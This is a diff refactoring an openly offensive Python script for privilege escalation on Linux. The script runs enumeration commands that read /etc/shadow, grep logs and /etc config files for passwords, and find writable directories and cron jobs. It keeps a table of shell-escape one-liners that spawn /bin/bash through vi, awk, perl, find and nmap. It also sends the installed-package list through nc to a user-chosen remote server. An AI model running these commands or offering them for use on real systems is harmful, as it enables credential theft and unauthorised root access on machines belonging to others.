@@ -57,7 +57,7 @@ def execCmd(cmdDict):
             results = ['[-] failed: {}'.format(e)]
         cmdDict[item]["results"]=results
         
-    return cmdDict
+    printResults(cmdDict)
 
 # print results for each previously executed command, no return value
 def printResults(cmdDict):
@@ -72,7 +72,7 @@ def printResults(cmdDict):
     return
 
 def writeResults(msg, results):
-    f = open("privcheckout.txt", "a");
+    f = open("privcheckout.txt", "a")
     f.write("[+] " + str(len(results)-1) + " " + msg)
     for result in results:
         if result.strip() != "":
@@ -90,8 +90,7 @@ sysInfo = {"OS":{"cmd":"cat /etc/issue","msg":"Operating System"},
        "HOSTNAME":{"cmd":"hostname", "msg":"Hostname"}
       }
 
-sysInfo = execCmd(sysInfo)
-printResults(sysInfo)
+execCmd(sysInfo)
 
 # Networking Info
 
@@ -105,8 +104,7 @@ netInfo = {"NETINFO":{"cmd":"/sbin/ifconfig -a", "msg":"Interfaces"},
        "SS":{"cmd":"ss -antup", "msg":"ss"}
       }
 
-netInfo = execCmd(netInfo)
-printResults(netInfo)
+execCmd(netInfo)
 
 # File System Info
 print( "[*] GETTING FILESYSTEM INFO...\n")
@@ -115,16 +113,14 @@ driveInfo = {"MOUNT":{"cmd":"mount","msg":"Mount results"},
          "FSTAB":{"cmd":"cat /etc/fstab 2>/dev/null", "msg":"fstab entries"}
         }
 
-driveInfo = execCmd(driveInfo)
-printResults(driveInfo)
+execCmd(driveInfo)
 
 # Scheduled Cron Jobs
 cronInfo = {"CRON":{"cmd":"ls -la /etc/cron* 2>/dev/null", "msg":"Scheduled cron jobs"},
         "CRONW": {"cmd":"ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null", "msg":"Writable cron dirs"}
        }
 
-cronInfo = execCmd(cronInfo)
-printResults(cronInfo)
+execCmd(cronInfo)
 
 # User Info
 print("\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n")
@@ -139,8 +135,7 @@ userInfo = {"WHOAMI":{"cmd":"whoami", "msg":"Current User"},
         "LOGGEDIN":{"cmd":"w 2>/dev/null", "msg":"Logged in User Activity"}
        }
 
-userInfo = execCmd(userInfo)
-printResults(userInfo)
+execCmd(userInfo)
 
 if "root" in userInfo["ID"]["results"][0]:
     print("[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n")
@@ -155,16 +150,14 @@ fdPerms = {"WWDIRSROOT":{"cmd":"find / \( -type d -perm -o+w \) -exec ls -ld '{}
        "ROOTHOME":{"cmd":"ls -ahlR /root 2>/dev/null", "msg":"Checking if root's home folder is accessible"}
       }
 
-fdPerms = execCmd(fdPerms) 
-printResults(fdPerms)
+execCmd(fdPerms)
 
 pwdFiles = {"LOGPWDS":{"cmd":"find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Logs containing keyword 'password'"},
         "CONFPWDS":{"cmd":"find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Config files containing keyword 'password'"},
         "SHADOW":{"cmd":"cat /etc/shadow 2>/dev/null", "msg":"Shadow File (Privileged)"}
        }
 
-pwdFiles = execCmd(pwdFiles)
-printResults(pwdFiles)
+execCmd(pwdFiles)
 
 # Processes and Applications
 print("[*] ENUMERATING PROCESSES AND APPLICATIONS...\n")
@@ -177,15 +170,13 @@ else:
 getAppProc = {"PROCS":{"cmd":"ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg":"Current processes"},
               "PKGS":{"cmd":getPkgs, "msg":"Installed Packages"}}
 
-getAppProc = execCmd(getAppProc)
-printResults(getAppProc) # comment to reduce output
+execCmd(getAppProc)
 
 otherApps = { "SUDO":{"cmd":"sudo -V | grep version 2>/dev/null", "msg":"Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)"},
           "APACHE":{"cmd":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null", "msg":"Apache Version and Modules"},
           "APACHECONF":{"cmd":"cat /etc/apache2/apache2.conf 2>/dev/null", "msg":"Apache Config File"}}
 
-otherApps = execCmd(otherApps)
-printResults(otherApps)
+execCmd(otherApps)
 
 print("[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n")
 
@@ -233,11 +224,16 @@ for key in procdict:
 print("\n[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n")
 
 devTools = {"TOOLS":{"cmd":"which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null", "msg":"Installed Tools"}}
-devTools = execCmd(devTools)
-printResults(devTools)
+execCmd(devTools)
 
 print("[+] Related Shell Escape Sequences...\n")
-escapeCmd = {"vi":[":!bash", ":set shell=/bin/bash:shell"], "awk":["awk 'BEGIN {system(\"/bin/bash\")}'"], "perl":["perl -e 'exec \"/bin/bash\";'"], "find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], "nmap":["--interactive"]}
+
+escapeCmd = {"vi":[":!bash", ":set shell=/bin/bash:shell"], 
+            "awk":["awk 'BEGIN {system(\"/bin/bash\")}'"], 
+            "perl":["perl -e 'exec \"/bin/bash\";'"], 
+            "find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], 
+            "nmap":["--interactive"]}
+
 for cmd in escapeCmd:
     for result in devTools["TOOLS"]["results"]:
         if cmd in result:
@@ -251,8 +247,7 @@ if 'y' in question.lower():
     port = input("[?] What port is the server using? ")
     print("[ ] Connecting to {}:{}".format(server,port))
     exploits = {"EXPLOITS":{"cmd":"dpkg -l | tail -n +6 | awk '{{print $2, $3}} END {{print \"\"}}' | nc {} {}".format(server, port), "msg":"Found the following possible exploits"}}
-    exploits_results = execCmd(exploits)
-    printResults(exploits)
+    execCmd(exploits)
 
 print("\n[+] Finished")
 print(bigline)
